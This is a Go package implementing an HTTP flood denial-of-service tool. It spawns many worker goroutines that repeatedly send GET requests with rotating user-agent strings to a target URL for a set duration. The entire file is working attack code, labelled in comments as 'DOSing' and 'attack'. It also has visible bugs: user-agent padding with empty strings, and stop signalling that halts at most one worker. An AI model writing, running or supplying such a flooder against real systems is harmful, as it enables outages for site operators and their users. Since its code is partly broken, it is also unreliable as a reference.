package dos

import (
		"os"
		"fmt"
		"time"
		"bufio"
		"runtime"
		"net/http"
		"math/rand"
)

// structure of DOS
type DOS struct {
		url string
		method string
		duration int
		workers int
		useragents []string
		headers map[string]string
		s chan bool
		client *http.Client
}

type ErrMethodDoesNotAllowed struct{
		method string
}

func (emdna *ErrMethodDoesNotAllowed) Error() string {
		return fmt.Sprintf("method %s does not allowed to use", emdna.method)
}

// making new instance of DOS
func New(url string, method string, duration int, workers int, path_to_useragents string, headers map[string]string) (*DOS, error) {
		// read useragents
		f, err := os.Open(path_to_useragents)
		if err != nil {
				fmt.Println("useragents wasn't found on this path: "+path_to_useragents)
				os.Exit(1)
		}
		scanner := bufio.NewScanner(f)
		useragents := make([]string, 1008)
		for scanner.Scan() {
				useragents = append(useragents, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
				fmt.Println("error while reading useragents, exiting...")
				os.Exit(1)
		}
		f.Close()
		// makinh channel to manipulate work of worlers
		s := make(chan bool)
		return &DOS{
				url: url,
				method: method,
				duration: duration,
				workers: workers,
				useragents: useragents,
				headers: headers,
				client: &http.Client{},
				s: s,
		}, nil
}

func (d *DOS) Run() {
		d.start()
		time.Sleep(time.Duration(d.duration)*time.Second)
		d.stop()
}

// start DOSing
func (d *DOS) start() {
		go func(){d.s<-false}()
		// starting workers
		for i := 0; i < d.workers; i++ {
				go func() {
						// generating seed to provide the real random number
						rand.Seed(time.Now().UnixNano())
						// random useragent
						useragent := d.useragents[rand.Intn(len(d.useragents))]
						for {
								select {
								case <- d.s:
										return
								default:
										err := d.attack(useragent)
										if err != nil {
												fmt.Println(err)
										} else {
												fmt.Println("requested "+d.url)
										}
						}
				}
				}()
		}
		// cleaning garbage
		runtime.Gosched()
}

// stop DOSing
func (d *DOS) stop() {
		go func(){d.s<-true}()
}

// making http request
func (d *DOS) attack(useragent string) error {
		if d.method == "GET" {
				req, err := http.NewRequest(d.method, d.url, nil)
				if err != nil {
						return err
				}
				req.Header.Set("User-Agent", useragent)
				resp, err := d.client.Do(req)
				if err != nil {
						return err
				} else {
						resp.Body.Close()
						return nil
				}
		} else {
				return &ErrMethodDoesNotAllowed{method:d.method}
		}
}
